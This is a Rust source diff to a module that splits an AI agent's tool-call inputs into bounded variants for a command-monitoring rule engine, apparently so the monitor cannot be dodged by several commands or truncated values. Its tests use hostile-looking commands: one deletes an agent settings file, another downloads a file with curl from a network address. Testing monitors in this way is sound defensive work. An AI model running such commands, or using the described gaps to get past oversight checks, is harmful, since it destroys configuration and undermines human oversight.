@@ -32,8 +32,12 @@
 //! - A continuation chunk of a command starts with the head of that command.
 //! - Two chunks of one value never share a variant: the second would be
 //!   renamed, and lose the name Telltale reads it by.
+//! - Telltale reads every top-level command of a call as one command text, so
+//!   a piece of one it cannot evaluate takes the others down with it. With
+//!   more than one command, no two share a variant, and none is an anchor.
 //!
-//! What cannot be kept together, or had to be rewritten, is reported as
+//! What cannot be kept together (more than one command included), or had to
+//! be rewritten, is reported as
 //! [`Projection::separated`], and the runtime then floors the verdict at
 //! `on_unevaluable`: findings keep their force, and "no finding" is not taken
 //! as an allow.
@@ -42,10 +46,15 @@
 //! or pieces of values than they hold. Past that budget a bounded set of
 //! variants is still evaluated rather than none: a short command and the first
 //! block of short top-level values go into every variant, every chunk of a
-//! longer command comes ahead of other values, and then the start of other
-//! values while variants remain. Within the budget the layout follows the
-//! input's own order. What does not fit is not evaluated, and is reported as
-//! separated, so it floors the verdict like anything else kept apart.
+//! longer command comes ahead of other values (first chunks first, so one
+//! command cannot crowd out another), and then the start of other values while
+//! variants remain. A command comes first whatever the member names sort as.
+//! History keeps a line of its own ([`Projection::history`]): the start of
+//! every command together, then short top-level values. Otherwise the layout
+//! follows key-sorted order (members arrive sorted by name, not in the order
+//! the agent wrote them). Whatever is in no variant, a value cut short for
+//! room included, is not evaluated, and is reported as separated, so it floors
+//! the verdict like anything else kept apart.
 
 use serde_json::{Map, Value};
 use telltale_schema::activity_facts::host_from_url_token;
@@ -119,9 +128,15 @@ pub(crate) fn is_command_key(key: &str) -> bool {
 pub struct Projection {
     /// Bounded inputs whose union covers every byte of the original.
     pub variants: Vec<Value>,
+    /// What history keeps of the call, within the bounds of a variant: the
+    /// start of every command, then short top-level values, then the start
+    /// of other values. Unlike the variants it holds the commands together,
+    /// so a later call can link to what each of them did.
+    pub history: Value,
     /// Values or parts of a command that a rule may need together are not
     /// together in any variant: more short top-level values than the variant
-    /// budget can pair up, or a command longer than one chunk. Also set when
+    /// budget can pair up, a command longer than one chunk, or more than one
+    /// command, which Telltale reads as one. Also set when
     /// a URL Telltale refuses had to be rewritten to be evaluated, and when
     /// the input is past the budget and part of it is in no variant.
     pub separated: bool,
@@ -165,7 +180,7 @@ fn scalar_items(value: &Value) -> Option<Vec<String>> {
         .and_then(|items| items.iter().map(scalar_text).collect())
 }
 
-/// Flatten to at most [`MAX_LEAVES`] leaves, in the input's order; past that,
+/// Flatten to at most [`MAX_LEAVES`] leaves, in key-sorted order; past that,
 /// a command first, then the other top-level values, then nested ones,
 /// whatever their names sort as.
 fn flatten(value: &Value) -> Flat {
@@ -394,12 +409,21 @@ struct Item {
     /// The leaf this is (a piece of): two pieces of one leaf never share a
     /// variant.
     leaf: usize,
+    /// A top-level command: two commands never share a variant either.
+    command: bool,
     /// Encoded bytes this adds to a variant.
     bytes: usize,
 }
 
 impl Item {
-    fn new(key: String, mut text: String, list: bool, leaf: usize, rewritten: &mut bool) -> Self {
+    fn new(
+        key: String,
+        mut text: String,
+        list: bool,
+        leaf: usize,
+        command: bool,
+        rewritten: &mut bool,
+    ) -> Self {
         *rewritten |= rewrite_refused_urls(&mut text);
         let bytes = escaped_len(&key) + escaped_len(&text) + MEMBER_OVERHEAD;
         Self {
@@ -407,6 +431,7 @@ impl Item {
             text,
             list,
             leaf,
+            command,
             bytes,
         }
     }
@@ -417,7 +442,7 @@ fn bytes_of(items: &[Item]) -> usize {
 }
 
 /// `items` in order, in runs of at most `count` items and `bytes` encoded
-/// bytes, and with no two pieces of one leaf in a run.
+/// bytes, and with no two pieces of one leaf, nor two commands, in a run.
 fn pack(items: &[Item], count: usize, bytes: usize) -> Vec<&[Item]> {
     let mut runs = Vec::new();
     let (mut start, mut used) = (0, 0);
@@ -426,7 +451,9 @@ fn pack(items: &[Item], count: usize, bytes: usize) -> Vec<&[Item]> {
         if !run.is_empty()
             && (run.len() == count
                 || used + item.bytes > bytes
-                || run.iter().any(|other| other.leaf == item.leaf))
+                || run
+                    .iter()
+                    .any(|other| other.leaf == item.leaf || (other.command && item.command)))
         {
             runs.push(run);
             (start, used) = (at, 0);
@@ -439,11 +466,11 @@ fn pack(items: &[Item], count: usize, bytes: usize) -> Vec<&[Item]> {
     runs
 }
 
-/// A variant holding `groups`. Flattening can give two values one key (`a.b`
+/// A variant holding `items`. Flattening can give two values one key (`a.b`
 /// beside `a: {b}`); the later one is renamed, so neither value is dropped.
-fn variant(groups: &[&[Item]]) -> Value {
+fn variant<'a>(items: impl IntoIterator<Item = &'a Item>) -> Value {
     let mut object = Map::new();
-    for item in groups.iter().flat_map(|group| group.iter()) {
+    for item in items {
         let text = Value::String(item.text.clone());
         if item.list
             && let Some(Value::Array(items)) = object.get_mut(&item.key)
@@ -465,6 +492,29 @@ fn variant(groups: &[&[Item]]) -> Value {
         object.insert(name, value);
     }
     Value::Object(object)
+}
+
+/// What history keeps of a projected call, within a variant's bounds: the
+/// first chunk of every command (in key order), then anchors, then the first
+/// chunks of other values, while they fit. If not every command fits, the
+/// call is already reported separated: it has more than one.
+fn history(anchors: &[Item], rest: &[Item]) -> Value {
+    let mut kept: Vec<&Item> = Vec::new();
+    let mut bytes = 0;
+    let commands = rest.iter().filter(|item| item.command);
+    for item in commands.chain(anchors).chain(rest) {
+        if kept.len() == LEAVES_PER_VARIANT {
+            break;
+        }
+        if kept.iter().any(|other| other.leaf == item.leaf)
+            || bytes + item.bytes > VARIANT_BYTES - 2
+        {
+            continue;
+        }
+        bytes += item.bytes;
+        kept.push(item);
+    }
+    variant(kept)
 }
 
 /// Bounded variants whose union covers every byte of `input`, or past the
@@ -490,21 +540,30 @@ pub fn project(input: &Value) -> Option<Projection> {
             .get(index)
             .is_some_and(|leaf| leaf.top && is_command_key(&leaf.key))
     };
+    // Telltale reads every command of a call as one command text, so a piece
+    // of one that it cannot evaluate would take the others down with it. With
+    // more than one, each is evaluated apart, and that is reported.
+    let apart = (0..leaves.len())
+        .filter(|&index| command_leaf(index))
+        .count()
+        > 1;
+    separated |= apart;
     // Anchors, and the pieces of the other leaves: each leaf's chunks, a
     // later chunk of a command behind the head of that command. A command is
     // cut first, so that no other value takes the room of its pieces, and
-    // each leaf keeps its place in the input's order.
+    // each leaf keeps its place in key-sorted order.
     let mut anchors: Vec<Item> = Vec::new();
     let mut long: Vec<(usize, String)> = Vec::new();
     let item = |index: usize, text: String, rewritten: &mut bool| {
         let leaf = &leaves[index];
         let key = bounded_key(&leaf.key, leaf.list.unwrap_or(index));
-        Item::new(key, text, leaf.list.is_some(), index, rewritten)
+        let command = command_leaf(index);
+        Item::new(key, text, leaf.list.is_some(), index, command, rewritten)
     };
     for (index, leaf) in leaves.iter().enumerate() {
         // Telltale evaluates the normalized text, and bounds it.
         let text: String = leaf.text.nfc().collect();
-        if leaf.top && text.len() <= ANCHOR_BYTES {
+        if leaf.top && text.len() <= ANCHOR_BYTES && !(apart && command_leaf(index)) {
             anchors.push(item(index, text, &mut rewritten));
         } else {
             long.push((index, text));
@@ -515,10 +574,12 @@ pub fn project(input: &Value) -> Option<Projection> {
     let mut count = 0;
     for (index, text) in long {
         let command = command_leaf(index);
-        // No more pieces than variants can hold: the rest is not cut.
+        // No more pieces than variants can hold: the rest is not cut, and is
+        // in no variant.
         let (mut chunks, all) = chunks(&text);
-        chunks.truncate(MAX_LEAVES - count);
-        whole &= all && !chunks.is_empty();
+        let room = MAX_LEAVES - count;
+        whole &= all && chunks.len() <= room;
+        chunks.truncate(room);
         if chunks.is_empty() {
             continue;
         }
@@ -543,17 +604,25 @@ pub fn project(input: &Value) -> Option<Projection> {
             String::new(),
             false,
             usize::MAX - index,
+            false,
             &mut rewritten,
         ));
     }
     separated |= rewritten || !whole;
+    // A command comes ahead of every other value, whatever the member names
+    // sort as: its anchor in the first block, which goes into every variant
+    // past the budget, and its pieces in the first groups.
+    anchors.sort_by_key(|item| !item.command);
     // The rest, first chunks first: the first chunks of all leaves side by
-    // side, then the second ones, and so on.
+    // side, commands first, then the second ones, and so on. A long command
+    // cannot crowd out the first chunk of another.
     let mut rest: Vec<Item> = Vec::with_capacity(count);
     let mut rounds: Vec<_> = pieces.into_iter().map(Vec::into_iter).collect();
+    rounds.sort_by_key(|round| !round.as_slice().first().is_some_and(|item| item.command));
     while rest.len() < count {
         rest.extend(rounds.iter_mut().filter_map(Iterator::next));
     }
+    let history = history(&anchors, &rest);
 
     // Few anchors go into every variant. More are split into blocks: every
     // two blocks share a variant, and so do every block and every group.
@@ -580,19 +649,20 @@ pub fn project(input: &Value) -> Option<Projection> {
         let mut variants = Vec::new();
         for group in &groups {
             for block in &blocks {
-                variants.push(variant(&[block, group]));
+                variants.push(variant(block.iter().chain(group.iter())));
             }
         }
         for (i, first) in blocks.iter().enumerate() {
             for second in &blocks[i + 1..] {
-                variants.push(variant(&[first, second]));
+                variants.push(variant(first.iter().chain(second.iter())));
             }
         }
         if variants.is_empty() {
-            variants.push(variant(&blocks));
+            variants.push(variant(blocks.iter().flat_map(|block| block.iter())));
         }
         return Some(Projection {
             variants,
+            history,
             separated,
             past_budget: !whole,
         });
@@ -608,7 +678,8 @@ pub fn project(input: &Value) -> Option<Projection> {
         let groups = pack(&all, LEAVES_PER_VARIANT, VARIANT_BYTES - 2);
         if groups.len() <= MAX_VARIANTS {
             return Some(Projection {
-                variants: groups.into_iter().map(|group| variant(&[group])).collect(),
+                variants: groups.into_iter().map(variant).collect(),
+                history,
                 separated: true,
                 past_budget: false,
             });
@@ -621,7 +692,7 @@ pub fn project(input: &Value) -> Option<Projection> {
     let mut others = all.split_off(lead);
     let pieces = others.split_off(anchor_count - lead);
     let (commands, pieces): (Vec<Item>, Vec<Item>) =
-        pieces.into_iter().partition(|item| command_leaf(item.leaf));
+        pieces.into_iter().partition(|item| item.command);
     let rest: Vec<Item> = commands.into_iter().chain(others).chain(pieces).collect();
     let first = all;
     let groups = pack(
@@ -632,10 +703,11 @@ pub fn project(input: &Value) -> Option<Projection> {
     let variants = groups
         .iter()
         .take(MAX_VARIANTS)
-        .map(|group| variant(&[&first, group]))
+        .map(|group| variant(first.iter().chain(group.iter())))
         .collect();
     Some(Projection {
         variants,
+        history,
         separated: true,
         past_budget: true,
     })
@@ -1001,9 +1073,80 @@ mod tests {
         }
     }
 
+    /// A value cut short because the variants hold no more pieces is part of
+    /// the input in no variant: that is reported, even when every value has
+    /// at least one piece in a variant and the pieces fill the variants.
+    #[test]
+    fn a_value_cut_for_room_is_reported_as_separated() {
+        let tail = "END_OF_THE_LAST_VALUE";
+        let input = json!({
+            "a": vec!["p"; 2047],
+            "b": format!("{}{tail}", "b".repeat(4000)),
+        });
+        let projection = project(&input).unwrap();
+        within_bounds(&projection.variants);
+        assert!(projection.separated || covered(&projection.variants, tail));
+    }
+
+    /// Telltale reads every command member of a call as one command, so a
+    /// piece of one that Telltale cannot evaluate takes the others down with
+    /// it. Each command is evaluated in variants without the others, from its
+    /// first chunk however long another is, and that they are apart is
+    /// reported.
+    #[test]
+    fn each_command_member_is_evaluated_apart_from_the_others() {
+        let short = "rm -f /w/.claude/settings.json";
+        let long = format!("echo {}; {short}", "a".repeat(5000));
+        for command in [short.to_owned(), long] {
+            let input = json!({"cmd": "c".repeat(400_000), "command": command});
+            let projection = project(&input).unwrap();
+            within_bounds(&projection.variants);
+            assert!(projection.separated && projection.past_budget);
+            let alone: Vec<Value> = projection
+                .variants
+                .into_iter()
+                .filter(|v| v.get("cmd").is_none())
+                .collect();
+            assert!(covered(&alone, &command[..30]), "{}", command.len());
+            assert!(covered(&alone, short), "{}", command.len());
+        }
+    }
+
+    /// What history keeps of a projected call holds the start of every
+    /// command member, beside its short top-level values, though the
+    /// variants evaluate the commands apart.
+    #[test]
+    fn history_holds_the_start_of_every_command_member() {
+        let download = "curl -o /tmp/x http://203.0.113.10/x";
+        let long = format!("{download}; echo {}", "a".repeat(5000));
+        for command in [download.to_owned(), long] {
+            let input = json!({
+                "cmd": "true",
+                "command": command,
+                "description": "d".repeat(5000),
+                "path": "/w/a",
+            });
+            let projection = project(&input).unwrap();
+            let history = &projection.history;
+            within_bounds(std::slice::from_ref(history));
+            assert_eq!(history["cmd"], "true", "{}", command.len());
+            let start = history["command"].as_str().unwrap();
+            assert!(start.starts_with(download), "{}", command.len());
+            assert_eq!(history["path"], "/w/a", "{}", command.len());
+            assert!(
+                projection
+                    .variants
+                    .iter()
+                    .all(|v| v.get("cmd").is_none() || v.get("command").is_none())
+            );
+        }
+    }
+
     /// Inputs past each limit of the budget beside `command`: more values than
     /// the variants hold (nested, and at the top level), more variants, a value
-    /// of more chunks, and more pieces.
+    /// of more chunks, and more pieces. Also past it with every value flattened
+    /// and the command not first by name, and with the pieces cut to what the
+    /// variants hold.
     fn past_the_budget(command: &str) -> Vec<(&'static str, Value)> {
         let values = |prefix: &str, n: usize, size: usize| -> Map<String, Value> {
             (0..n)
@@ -1033,6 +1176,14 @@ mod tests {
             (
                 "pieces",
                 json!({"command": command, "a": values("k", 20, 300_000)}),
+            ),
+            (
+                "complete flatten, command not first",
+                top(2047, ANCHOR_BYTES),
+            ),
+            (
+                "count truncation",
+                json!({"a": vec!["p"; 2046], "command": command, "z": "z".repeat(9000)}),
             ),
         ]
     }
@@ -1080,7 +1231,7 @@ mod tests {
         }
     }
 
-    /// Within the budget, the layout follows the input's own member order:
+    /// Within the budget, the layout follows key-sorted member order:
     /// values first chunks first, packed in that order.
     #[test]
     fn an_input_within_the_budget_keeps_its_layout() {
